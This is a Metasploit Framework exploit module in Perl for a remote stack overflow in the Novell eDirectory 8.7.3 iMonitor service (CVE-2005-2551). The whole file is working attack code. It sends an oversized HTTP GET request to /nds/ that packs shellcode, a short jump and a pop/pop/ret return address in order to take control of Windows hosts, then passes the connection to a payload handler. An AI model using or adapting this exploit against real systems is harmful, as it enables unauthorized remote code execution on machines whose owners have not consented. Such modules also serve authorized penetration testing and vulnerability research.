Novell eDirectory 8.7.3 iMonitor Remote Stack Overflow
======================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::edirectory_imonitor;
use strict;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;    => &#039;eDirectory 8.7.3 iMonitor Remote Stack Overflow&#039;,
	&#039;Version&#039; => &#039;$Revision: 1.2 $&#039;,
	&#039;Authors&#039; => [ &#039;anonymous&#039; ],
	  
	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039;, &#039;winnt&#039;, &#039;winxp&#039;, &#039;win2k&#039;, &#039;win2003&#039; ],
	&#039;Priv&#039;  => 1,

	&#039;AutoOpts&#039;  =>  { &#039;EXITFUNC&#039; => &#039;thread&#039; },

	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 8008 ],
		&#039;VHOST&#039; => [0, &#039;DATA&#039;, &#039;The virtual host name of the server&#039;],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 0x1036,
		&#039;BadChars&#039;  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%",
		&#039;Keys&#039; 	    => [&#039;+ws2ord&#039;],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in eDirectory 8.7.3 iMonitor
	service. This vulnerability was discovered by Peter Winter-Smith of 
	NGSSoftware.

}),

	&#039;Refs&#039;  =>
	  [
	  	[&#039;OSVDB&#039;, &#039;18703&#039;],
		[&#039;CVE&#039;,   &#039;2005-2551&#039;],
		[&#039;BID&#039;,   &#039;14548&#039;],
	  ],

	&#039;Targets&#039; =>
	  [
		[ &#039;Windows (ALL) - eDirectory 8.7.3 iMonitor&#039;, 0x63501f15] # pop/pop/ret
	  ],

	&#039;Keys&#039;  => [&#039;imonitor&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;SSL&#039;      => $self->GetVar(&#039;SSL&#039;),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( &#039;[*] Error creating socket: &#039; . $s->GetError );
		return;
	}

	# pop/pop/ret in ndsimon.dlm on our jump to our shellcode
	my $req = $shellcode . "\x90\x90\xeb\x04" . pack(&#039;V&#039;, $target->[1]) . "\xe9\xbd\xef\xff\xff" . ("B" x 0xD0);
	my $request =
	  "GET /nds/$req HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	$s->Send($request);

	$self->PrintLine("[*] Overflow request sent, sleeping for four seconds");
	select(undef, undef, undef, 4);

	$self->Handler($s);
	return;
}

1;


